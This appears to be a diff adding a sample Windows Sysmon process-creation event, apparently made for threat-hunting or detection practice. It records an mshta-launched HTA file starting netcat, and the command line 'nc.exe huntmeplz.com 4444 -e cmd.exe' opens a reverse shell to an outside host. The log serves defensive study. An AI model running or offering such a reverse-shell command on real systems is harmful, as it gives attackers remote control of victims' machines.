@@ -1,0 +1,24 @@
+Field:	Value
+CommandLine:	"C:\Users\victim\AppData\Local\Temp\nc.exe" huntmeplz.com 4444 -e cmd.exe
+Company:	-
+CurrentDirectory:	C:\Users\victim\Downloads\
+Description:	-
+EventID:	1
+FileVersion:	-
+Hashes:	MD5=523613A7B9DFA398CBD5EBD2DD0F4F38,SHA256=3E59379F585EBF0BECB6B4E06D0FBBF806DE28A4BB256E837B4555F1B4245571,IMPHASH=567531F08180AB3963B70889578118A3
+Image:	C:\Users\victim\AppData\Local\Temp\nc.exe
+IntegrityLevel:	Medium
+LogonGuid:	{4bbef3ae-81e4-630c-b94b-100000000000}
+LogonId:	0x104bb9
+OriginalFileName:	-
+ParentCommandLine:	"C:\Windows\SysWOW64\mshta.exe" "C:\Users\victim\Downloads\update.hta" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}
+ParentImage:	C:\Windows\SysWOW64\mshta.exe
+ParentProcessGuid:	{4bbef3ae-cbcf-630c-010f-000000000e00}
+ParentProcessId:	8820
+ParentUser:	User\victim
+ProcessGuid:	{4bbef3ae-cbcf-630c-040f-000000000e00}
+ProcessId:	6688
+Product:	-
+RuleName:	-
+TerminalSessionId:	2
+User:	User\victim
